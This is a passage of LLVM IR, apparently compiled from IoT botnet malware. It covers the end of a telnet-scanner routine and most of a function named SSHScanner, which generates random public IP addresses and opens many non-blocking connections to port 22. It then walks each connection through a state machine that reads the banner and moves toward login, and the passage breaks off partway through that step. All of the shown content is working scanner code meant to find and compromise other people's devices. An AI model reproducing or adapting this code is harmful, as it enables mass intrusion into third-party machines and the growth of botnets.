  %2295 = sext i32 %2294 to i64
  %2296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2295
  %2297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2296, i32 0, i32 2
  store i8 0, i8* %2297, align 8
  %2298 = load i32, i32* %2, align 4
  %2299 = sext i32 %2298 to i64
  %2300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2299
  %2301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2300, i32 0, i32 3
  store i8 1, i8* %2301, align 1
  br label %2302

; <label>:2302:                                   ; preds = %2287, %2277
  br label %2303

; <label>:2303:                                   ; preds = %2302, %2011, %1980, %1952, %1924, %1900, %1194, %1130, %765, %701, %390, %232, %69
  br label %2304

; <label>:2304:                                   ; preds = %2303, %2203, %2143, %2083, %2030, %1965, %1937, %1909, %1857, %1832, %1791, %1766, %1725, %1700, %1659, %1634, %1593, %1568, %1527, %1502, %1461, %1436, %1395, %1370, %1342, %1301, %1276, %1248, %1179, %1156, %1078, %1055, %1032, %1009, %986, %963, %940, %917, %894, %880, %829, %750, %727, %655, %604, %553, %502, %451, %314, %185, %141
  %2305 = load i32, i32* %2, align 4
  %2306 = add nsw i32 %2305, 1
  store i32 %2306, i32* %2, align 4
  br label %65

; <label>:2307:                                   ; preds = %65
  br label %63
                                                  ; No predecessors!
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare i32 @system(i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #4

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind uwtable
define void @SSHScanner() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = call i32 @getdtablesize() #2
  %15 = sdiv i32 %14, 4
  %16 = mul nsw i32 %15, 3
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = icmp sgt i32 %17, 512
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %0
  br label %22

; <label>:20:                                     ; preds = %0
  %21 = load i32, i32* %1, align 4
  br label %22

; <label>:22:                                     ; preds = %20, %19
  %23 = phi i32 [ 512, %19 ], [ %21, %20 ]
  store i32 %23, i32* %1, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call zeroext i16 @htons(i16 zeroext 22) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %28 = getelementptr inbounds [8 x i8], [8 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 8, i32 4, i1 false)
  %29 = load i32, i32* %1, align 4
  %30 = zext i32 %29 to i64
  %31 = call i8* @llvm.stacksave()
  store i8* %31, i8** %9, align 8
  %32 = alloca %struct.telstate_t, i64 %30, align 16
  %33 = bitcast %struct.telstate_t* %32 to i8*
  %34 = load i32, i32* %1, align 4
  %35 = sext i32 %34 to i64
  %36 = mul i64 %35, 5
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 %36, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  br label %37

; <label>:37:                                     ; preds = %56, %22
  %38 = load i32, i32* %2, align 4
  %39 = load i32, i32* %1, align 4
  %40 = icmp slt i32 %38, %39
  br i1 %40, label %41, label %59

; <label>:41:                                     ; preds = %37
  %42 = load i32, i32* %2, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %43
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i32 0, i32 3
  store i8 1, i8* %45, align 1
  %46 = call noalias i8* @malloc(i64 1024) #2
  %47 = load i32, i32* %2, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %48
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i32 0, i32 8
  store i8* %46, i8** %50, align 8
  %51 = load i32, i32* %2, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %52
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %53, i32 0, i32 8
  %55 = load i8*, i8** %54, align 8
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 1024, i32 1, i1 false)
  br label %56

; <label>:56:                                     ; preds = %41
  %57 = load i32, i32* %2, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* %2, align 4
  br label %37

; <label>:59:                                     ; preds = %37
  %60 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 5, i64* %60, align 8
  %61 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 0, i64* %61, align 8
  br label %62

; <label>:62:                                     ; preds = %2267, %59
  br label %63

; <label>:63:                                     ; preds = %62
  store i32 0, i32* %2, align 4
  br label %64

; <label>:64:                                     ; preds = %2264, %63
  %65 = load i32, i32* %2, align 4
  %66 = load i32, i32* %1, align 4
  %67 = icmp slt i32 %65, %66
  br i1 %67, label %68, label %2267

; <label>:68:                                     ; preds = %64
  %69 = load i32, i32* %2, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %70
  %72 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %71, i32 0, i32 2
  %73 = load i8, i8* %72, align 8
  %74 = zext i8 %73 to i32
  switch i32 %74, label %2263 [
    i32 0, label %75
    i32 1, label %232
    i32 2, label %390
    i32 3, label %701
    i32 4, label %769
    i32 5, label %1130
    i32 6, label %1198
    i32 7, label %1900
    i32 8, label %1928
    i32 9, label %1956
    i32 10, label %2010
  ]

; <label>:75:                                     ; preds = %68
  %76 = load i32, i32* %2, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %77
  %79 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %78, i32 0, i32 8
  %80 = load i8*, i8** %79, align 8
  call void @llvm.memset.p0i8.i64(i8* %80, i8 0, i64 1024, i32 1, i1 false)
  %81 = load i32, i32* %2, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %82
  %84 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %83, i32 0, i32 3
  %85 = load i8, i8* %84, align 1
  %86 = icmp ne i8 %85, 0
  br i1 %86, label %87, label %107

; <label>:87:                                     ; preds = %75
  %88 = load i32, i32* %2, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %89
  %91 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %90, i32 0, i32 8
  %92 = load i8*, i8** %91, align 8
  store i8* %92, i8** %11, align 8
  %93 = load i32, i32* %2, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %94
  %96 = bitcast %struct.telstate_t* %95 to i8*
  call void @llvm.memset.p0i8.i64(i8* %96, i8 0, i64 32, i32 16, i1 false)
  %97 = load i8*, i8** %11, align 8
  %98 = load i32, i32* %2, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %99
  %101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %100, i32 0, i32 8
  store i8* %97, i8** %101, align 8
  %102 = call i32 @getRandomPublicIP()
  %103 = load i32, i32* %2, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %104
  %106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %105, i32 0, i32 1
  store i32 %102, i32* %106, align 4
  br label %146

; <label>:107:                                    ; preds = %75
  %108 = load i32, i32* %2, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %109
  %111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %110, i32 0, i32 5
  %112 = load i8, i8* %111, align 1
  %113 = add i8 %112, 1
  store i8 %113, i8* %111, align 1
  %114 = load i32, i32* %2, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %115
  %117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %116, i32 0, i32 5
  %118 = load i8, i8* %117, align 1
  %119 = zext i8 %118 to i64
  %120 = icmp eq i64 %119, 13
  br i1 %120, label %121, label %132

; <label>:121:                                    ; preds = %107
  %122 = load i32, i32* %2, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %123
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %124, i32 0, i32 5
  store i8 0, i8* %125, align 1
  %126 = load i32, i32* %2, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %127
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %128, i32 0, i32 4
  %130 = load i8, i8* %129, align 2
  %131 = add i8 %130, 1
  store i8 %131, i8* %129, align 2
  br label %132

; <label>:132:                                    ; preds = %121, %107
  %133 = load i32, i32* %2, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %134
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %135, i32 0, i32 4
  %137 = load i8, i8* %136, align 2
  %138 = zext i8 %137 to i64
  %139 = icmp eq i64 %138, 4
  br i1 %139, label %140, label %145

; <label>:140:                                    ; preds = %132
  %141 = load i32, i32* %2, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %142
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %143, i32 0, i32 3
  store i8 1, i8* %144, align 1
  br label %2264

; <label>:145:                                    ; preds = %132
  br label %146

; <label>:146:                                    ; preds = %145, %87
  %147 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %147, align 4
  %148 = call zeroext i16 @htons(i16 zeroext 22) #13
  %149 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %148, i16* %149, align 2
  %150 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %151 = getelementptr inbounds [8 x i8], [8 x i8]* %150, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %151, i8 0, i64 8, i32 4, i1 false)
  %152 = load i32, i32* %2, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %153
  %155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %154, i32 0, i32 1
  %156 = load i32, i32* %155, align 4
  %157 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %158 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %157, i32 0, i32 0
  store i32 %156, i32* %158, align 4
  %159 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %160 = load i32, i32* %2, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %161
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %162, i32 0, i32 0
  store i32 %159, i32* %163, align 16
  %164 = load i32, i32* %2, align 4
  %165 = sext i32 %164 to i64
  %166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %165
  %167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %166, i32 0, i32 0
  %168 = load i32, i32* %167, align 16
  %169 = bitcast %struct.timeval* %10 to i8*
  %170 = call i32 @setsockopt(i32 %168, i32 1, i32 20, i8* %169, i32 16) #2
  %171 = load i32, i32* %2, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %172
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %173, i32 0, i32 0
  %175 = load i32, i32* %174, align 16
  %176 = bitcast %struct.timeval* %10 to i8*
  %177 = call i32 @setsockopt(i32 %175, i32 1, i32 21, i8* %176, i32 16) #2
  %178 = load i32, i32* %2, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %179
  %181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %180, i32 0, i32 0
  %182 = load i32, i32* %181, align 16
  %183 = icmp eq i32 %182, -1
  br i1 %183, label %184, label %185

; <label>:184:                                    ; preds = %146
  br label %2264

; <label>:185:                                    ; preds = %146
  %186 = load i32, i32* %2, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %187
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %188, i32 0, i32 0
  %190 = load i32, i32* %189, align 16
  %191 = load i32, i32* %2, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %192
  %194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %193, i32 0, i32 0
  %195 = load i32, i32* %194, align 16
  %196 = call i32 (i32, i32, ...) @fcntl(i32 %195, i32 3, i8* null)
  %197 = or i32 %196, 2048
  %198 = call i32 (i32, i32, ...) @fcntl(i32 %190, i32 4, i32 %197)
  %199 = load i32, i32* %2, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %200
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %201, i32 0, i32 0
  %203 = load i32, i32* %202, align 16
  %204 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %205 = call i32 @connect(i32 %203, %struct.sockaddr* %204, i32 16)
  %206 = icmp eq i32 %205, -1
  br i1 %206, label %207, label %222

; <label>:207:                                    ; preds = %185
  %208 = call i32* @__errno_location() #13
  %209 = load i32, i32* %208, align 4
  %210 = icmp ne i32 %209, 115
  br i1 %210, label %211, label %222

; <label>:211:                                    ; preds = %207
  %212 = load i32, i32* %2, align 4
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %213
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %214, i32 0, i32 0
  %216 = load i32, i32* %215, align 16
  %217 = call i32 @sclose(i32 %216)
  %218 = load i32, i32* %2, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %219
  %221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %220, i32 0, i32 3
  store i8 1, i8* %221, align 1
  br label %231

; <label>:222:                                    ; preds = %207, %185
  %223 = load i32, i32* %2, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %224
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %225, i32 0, i32 2
  store i8 1, i8* %226, align 8
  %227 = load i32, i32* %2, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %228
  %230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %229, i32 0, i32 6
  store i32 0, i32* %230, align 4
  br label %231

; <label>:231:                                    ; preds = %222, %211
  br label %2263

; <label>:232:                                    ; preds = %68
  %233 = load i32, i32* %2, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %234
  %236 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %235, i32 0, i32 6
  %237 = load i32, i32* %236, align 4
  %238 = icmp eq i32 %237, 0
  br i1 %238, label %239, label %246

; <label>:239:                                    ; preds = %232
  %240 = call i64 @time(i64* null) #2
  %241 = trunc i64 %240 to i32
  %242 = load i32, i32* %2, align 4
  %243 = sext i32 %242 to i64
  %244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %243
  %245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %244, i32 0, i32 6
  store i32 %241, i32* %245, align 4
  br label %246

; <label>:246:                                    ; preds = %239, %232
  br label %247

; <label>:247:                                    ; preds = %246
  %248 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %249 = getelementptr inbounds [16 x i64], [16 x i64]* %248, i64 0, i64 0
  %250 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %249) #2, !srcloc !6
  %251 = extractvalue { i64, i64* } %250, 0
  %252 = extractvalue { i64, i64* } %250, 1
  %253 = trunc i64 %251 to i32
  store i32 %253, i32* %12, align 4
  %254 = ptrtoint i64* %252 to i64
  %255 = trunc i64 %254 to i32
  store i32 %255, i32* %13, align 4
  br label %256

; <label>:256:                                    ; preds = %247
  br label %257

; <label>:257:                                    ; preds = %256
  %258 = load i32, i32* %2, align 4
  %259 = sext i32 %258 to i64
  %260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %259
  %261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %260, i32 0, i32 0
  %262 = load i32, i32* %261, align 16
  %263 = srem i32 %262, 64
  %264 = zext i32 %263 to i64
  %265 = shl i64 1, %264
  %266 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %267 = load i32, i32* %2, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %268
  %270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %269, i32 0, i32 0
  %271 = load i32, i32* %270, align 16
  %272 = sdiv i32 %271, 64
  %273 = sext i32 %272 to i64
  %274 = getelementptr inbounds [16 x i64], [16 x i64]* %266, i64 0, i64 %273
  %275 = load i64, i64* %274, align 8
  %276 = or i64 %275, %265
  store i64 %276, i64* %274, align 8
  %277 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %277, align 8
  %278 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %278, align 8
  %279 = load i32, i32* %2, align 4
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %280
  %282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %281, i32 0, i32 0
  %283 = load i32, i32* %282, align 16
  %284 = add nsw i32 %283, 1
  %285 = call i32 @select(i32 %284, %struct.__sigset_t* null, %struct.__sigset_t* %4, %struct.__sigset_t* null, %struct.timeval* %5)
  store i32 %285, i32* %3, align 4
  %286 = load i32, i32* %3, align 4
  %287 = icmp eq i32 %286, 1
  br i1 %287, label %288, label %345

; <label>:288:                                    ; preds = %257
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %289 = load i32, i32* %2, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %290
  %292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %291, i32 0, i32 0
  %293 = load i32, i32* %292, align 16
  %294 = bitcast i32* %7 to i8*
  %295 = call i32 @getsockopt(i32 %293, i32 1, i32 4, i8* %294, i32* %6) #2
  %296 = load i32, i32* %7, align 4
  %297 = icmp ne i32 %296, 0
  br i1 %297, label %298, label %313

; <label>:298:                                    ; preds = %288
  %299 = load i32, i32* %2, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %300
  %302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %301, i32 0, i32 0
  %303 = load i32, i32* %302, align 16
  %304 = call i32 @sclose(i32 %303)
  %305 = load i32, i32* %2, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %306
  %308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %307, i32 0, i32 2
  store i8 0, i8* %308, align 8
  %309 = load i32, i32* %2, align 4
  %310 = sext i32 %309 to i64
  %311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %310
  %312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %311, i32 0, i32 3
  store i8 1, i8* %312, align 1
  br label %344

; <label>:313:                                    ; preds = %288
  %314 = load i32, i32* %2, align 4
  %315 = sext i32 %314 to i64
  %316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %315
  %317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %316, i32 0, i32 0
  %318 = load i32, i32* %317, align 16
  %319 = load i32, i32* %2, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %320
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %321, i32 0, i32 0
  %323 = load i32, i32* %322, align 16
  %324 = call i32 (i32, i32, ...) @fcntl(i32 %323, i32 3, i8* null)
  %325 = and i32 %324, -2049
  %326 = call i32 (i32, i32, ...) @fcntl(i32 %318, i32 4, i32 %325)
  %327 = load i32, i32* %2, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %328
  %330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %329, i32 0, i32 6
  store i32 0, i32* %330, align 4
  %331 = load i32, i32* %2, align 4
  %332 = sext i32 %331 to i64
  %333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %332
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %333, i32 0, i32 7
  store i16 0, i16* %334, align 16
  %335 = load i32, i32* %2, align 4
  %336 = sext i32 %335 to i64
  %337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %336
  %338 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %337, i32 0, i32 8
  %339 = load i8*, i8** %338, align 8
  call void @llvm.memset.p0i8.i64(i8* %339, i8 0, i64 1024, i32 1, i1 false)
  %340 = load i32, i32* %2, align 4
  %341 = sext i32 %340 to i64
  %342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %341
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %342, i32 0, i32 2
  store i8 2, i8* %343, align 8
  br label %2264

; <label>:344:                                    ; preds = %298
  br label %364

; <label>:345:                                    ; preds = %257
  %346 = load i32, i32* %3, align 4
  %347 = icmp eq i32 %346, -1
  br i1 %347, label %348, label %363

; <label>:348:                                    ; preds = %345
  %349 = load i32, i32* %2, align 4
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %350
  %352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %351, i32 0, i32 0
  %353 = load i32, i32* %352, align 16
  %354 = call i32 @sclose(i32 %353)
  %355 = load i32, i32* %2, align 4
  %356 = sext i32 %355 to i64
  %357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %356
  %358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %357, i32 0, i32 2
  store i8 0, i8* %358, align 8
  %359 = load i32, i32* %2, align 4
  %360 = sext i32 %359 to i64
  %361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %360
  %362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %361, i32 0, i32 3
  store i8 1, i8* %362, align 1
  br label %363

; <label>:363:                                    ; preds = %348, %345
  br label %364

; <label>:364:                                    ; preds = %363, %344
  %365 = load i32, i32* %2, align 4
  %366 = sext i32 %365 to i64
  %367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %366
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %367, i32 0, i32 6
  %369 = load i32, i32* %368, align 4
  %370 = add i32 %369, 10
  %371 = zext i32 %370 to i64
  %372 = call i64 @time(i64* null) #2
  %373 = icmp slt i64 %371, %372
  br i1 %373, label %374, label %389

; <label>:374:                                    ; preds = %364
  %375 = load i32, i32* %2, align 4
  %376 = sext i32 %375 to i64
  %377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %376
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %377, i32 0, i32 0
  %379 = load i32, i32* %378, align 16
  %380 = call i32 @sclose(i32 %379)
  %381 = load i32, i32* %2, align 4
  %382 = sext i32 %381 to i64
  %383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %382
  %384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %383, i32 0, i32 2
  store i8 0, i8* %384, align 8
  %385 = load i32, i32* %2, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %386
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %387, i32 0, i32 3
  store i8 1, i8* %388, align 1
  br label %389

; <label>:389:                                    ; preds = %374, %364
  br label %2263

; <label>:390:                                    ; preds = %68
  %391 = load i32, i32* %2, align 4
  %392 = sext i32 %391 to i64
  %393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %392
  %394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %393, i32 0, i32 6
  %395 = load i32, i32* %394, align 4
  %396 = icmp eq i32 %395, 0
  br i1 %396, label %397, label %404

; <label>:397:                                    ; preds = %390
  %398 = call i64 @time(i64* null) #2
  %399 = trunc i64 %398 to i32
  %400 = load i32, i32* %2, align 4
  %401 = sext i32 %400 to i64
  %402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %401
  %403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %402, i32 0, i32 6
  store i32 %399, i32* %403, align 4
  br label %404

; <label>:404:                                    ; preds = %397, %390
  %405 = load i32, i32* %2, align 4
  %406 = sext i32 %405 to i64
  %407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %406
  %408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %407, i32 0, i32 0
  %409 = load i32, i32* %408, align 16
  %410 = load i32, i32* %2, align 4
  %411 = sext i32 %410 to i64
  %412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %411
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %412, i32 0, i32 8
  %414 = load i8*, i8** %413, align 8
  %415 = load i32, i32* %2, align 4
  %416 = sext i32 %415 to i64
  %417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %416
  %418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %417, i32 0, i32 7
  %419 = load i16, i16* %418, align 16
  %420 = zext i16 %419 to i32
  %421 = call i32 @readUntil(i32 %409, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %414, i32 1024, i32 %420)
  %422 = icmp ne i32 %421, 0
  br i1 %422, label %423, label %455

; <label>:423:                                    ; preds = %404
  %424 = load i32, i32* %2, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %425
  %427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %426, i32 0, i32 6
  store i32 0, i32* %427, align 4
  %428 = load i32, i32* %2, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %429
  %431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %430, i32 0, i32 7
  store i16 0, i16* %431, align 16
  %432 = load i32, i32* %2, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %433
  %435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %434, i32 0, i32 8
  %436 = load i8*, i8** %435, align 8
  %437 = call i8* @strstr(i8* %436, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %438 = icmp ne i8* %437, null
  br i1 %438, label %439, label %444

; <label>:439:                                    ; preds = %423
  %440 = load i32, i32* %2, align 4
  %441 = sext i32 %440 to i64
  %442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %441
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %442, i32 0, i32 2
  store i8 5, i8* %443, align 8
  br label %450

; <label>:444:                                    ; preds = %423
  %445 = load i32, i32* %2, align 4
